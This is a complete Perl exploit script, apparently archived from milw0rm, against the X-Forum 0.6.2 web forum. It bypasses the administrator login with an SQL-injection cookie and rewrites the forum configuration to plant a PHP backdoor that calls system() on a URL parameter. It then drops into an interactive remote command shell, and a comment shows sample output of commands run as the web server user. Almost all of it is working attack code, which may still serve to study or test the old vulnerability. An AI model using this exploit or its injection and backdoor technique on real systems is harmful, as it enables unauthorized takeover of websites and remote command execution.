#!/usr/bin/perl

# Web App: X-Forum 0.6.2
# Link   : http://freefr.dl.sourceforge.net/sourceforge/x-forum/xforum-0.6.2.tar.gz
# Bug    : Auth Bypass via Cookie Handling
#        : There are also other SQL Injections

# Remote Command Execution Exploit
# Credits to Giovanni Buzzin, "Osirys"
# Mail osirys[at]autistici[dot]org

# It logs in using an SQL Inj (AUTH BYPASS) via Cookie, then edits the configuration
# putting in it the backdoor. Needs the nick of the admin !

# ---------------------------------------------------------------------------
# Sploit
# ---------------------------------------------------------------------------
# osirys[~]>$ perl spll.txt http://localhost/x-forum/xforum/ admin
#
#   ----------------------------
#        X-Forum RCE Exploit
#          Coded by Osirys
#   ----------------------------
#
# [*] Bypassing Admin Login with a evil cookie !
# [*] Admin Login Bypassed ..
# [*] Getting previous configuration ..
# [*] Previous configuration loaded ..
# [*] Overwriting .....
# [*] Configuration edited, backdoored !!
# [*] Shell succesfully spawned !!
# [:D Hi myLord, execute your commands !!
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/x-forum/xforum
# shell[localhost]$> exit
# [-] Quitting ..
#
# osirys[~]>$
#  ---------------------------------------------------------------------------

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;

my $host  =  $ARGV[0];
my $user  =  $ARGV[1];
my $rce_p =  "/Config.php?cmd=";
my @conf  =  ();

chomp($user);
$user =~ s/\%([A-Fa-f0-9]{2})/pack('C', hex($1))/seg;
$user =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;

$cookie = "cookie_username=".$user."' or '1=1; cookie_password=p0wa";

help("-1") unless (($host)&&($user));
cheek($host) == 1 || help("-2");
&banner;

$datas = get_data($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print "[*] Bypassing Admin Login with a evil cookie !\n";
socket_req("GET",$path."/Configure.php",$cookie,"Manage Boards",1);
if ($gotcha == 1) {
    print "[*] Admin Login Bypassed ..\n";
}
else {
    print "[-] Bad admin's nick or site not vulnerable !\nn";
    exit(0);
}
print "[*] Getting previous configuration ..\n";
socket_req("GET",$path."/Configure.php",$cookie,"",2);

if (scalar(@conf) == 23) {
    print "[*] Previous configuration loaded ..\n";
}
print "[*] Overwriting .....\n";

my $post = "serverName=".$conf[0]."&userName=".$conf[1]."&password=".$conf[2]."&databaseName=".$conf[3].
           "&iconsDir=".$conf[4]."&buttonsDir=".$conf[5]."&emailPassword=FALSE&uniqueEMail=TRUE&member".
           "Level=0&memberStatus=1&memberGroup=1&threadStatus=1&postStatus=1&forumName=".$conf[6]."&ic".
           "onsPerRow=".$conf[7]."&boardImage=". $conf[8]."&boardImageNew=". $conf[9] ."&categoryImage="
           .$conf[10] ."&categoryImageNew=" . $conf[11] ."&threadImage=". $conf[12] . "&threadImageNew="
           .$conf[13]."&backColor=".$conf[14]."&textColor=".$conf[15]."&fontFace=".$conf[16]."&linkCol".
           "or=".$conf[17]."&borderColor=". $conf[18]."&titleColor=".$conf[19]."&bodyColor=". $conf[20].
           "&adminEMail=".$conf[21]."%22%29%3Becho+%22sp4wn%3Cbr%3E%22%3Bsystem%28%24_GET%5Bcmd%5D%29%".
           "3Bdefine%28%22p0wa%22%2C%22lol&logoutURL=".$conf[22]."&submit=Update+Configuration";


$post =~ s/,/%2C/g;
$post =~ s/ /+/g;
$post =~ s/#/%23/g;
$post =~ s/@/%40/g;

socket_req("POST",$path."/SaveConfig.php",$cookie,$post,0,"",1);

my $exec_url = ($host.$rce_p);
my $re = get_req($exec_url);
if ($re =~ /sp4wn/) {
    print "[*] Configuration edited, backdoored !!\n[*] Shell succesfully spawned !!\n[:D Hi myLord, execute your commands !!\n\n";
    &exec_cmd;
}
else {
    print "[-] Something wrong, sploit failed !\n\n";
    exit(0);
}

sub socket_req() {
    my($request,$path,$cookie,$content,$opt,$regexp,$sock_opt) = @_;
    my $stop;
    my $length = length($content);
    my $socket   =  new IO::Socket::INET(
                                            PeerAddr => $h0st,
                                            PeerPort => '80',
                                            Proto    => 'tcp',
                                         ) or die $!;

    if ($sock_opt == 1) {
        $opt_1 = "Referer: ".$host."/Configure.php\r\n";
        $opt_2 = "Content-Type: application/x-www-form-urlencoded\r\n";
    }
    else {
        $opt_1 = "";
        $opt_2 = "";
    }
    my $data = $request." ".$path." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               $opt_1.
               "Cookie: ".$cookie."\r\n".
               $opt_2.
               "Content-Length: ".$length."\r\n\r\n".
               $content."\r\n";

    $socket->send($data);
    while ((my $e = <$socket>)&&($stop != 1)) {
        if ($opt == 0) {
            $stop = 1;
        }
        elsif ($opt == 1) {
            if ($e =~ /$regexp/) {
                ($stop,$gotcha) = (1,1);
            }
        }
        elsif ($opt == 2) {
            get_previous_conf($e);
        }
    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n\n";
    $exec_url = $host.$rce_p.$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ m/sp4wn<br>(.+)/g) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_data() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $h0st !~ /www/ || $h0st =~ s/www\.//;
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub get_previous_conf() {
    my $string = $_[0];
    if ($string =~ /name="serverName" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="userName" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="password" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="databaseName" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="iconsDir" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="buttonsDir" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="forumName" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="iconsPerRow" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="boardImage" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="boardImageNew" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="categoryImage" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="categoryImageNew" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="threadImage" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="threadImageNew" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="backColor" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="textColor" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="fontFace" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="linkColor" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="borderColor" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="titleColor" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="bodyColor" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="adminEMail" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name="logoutURL" size="60" value="(.+)">/) {
        push(@conf,$1);
    }
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  ---------------------------- \n".
          "       X-Forum RCE Exploit     \n".
          "         Coded by Osirys       \n".
          "  ---------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad Input!\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path admin_username\n";
    print "    admin_username is the nick of the admin.\n\n";
    exit(0);
}

# milw0rm.com [2009-03-30]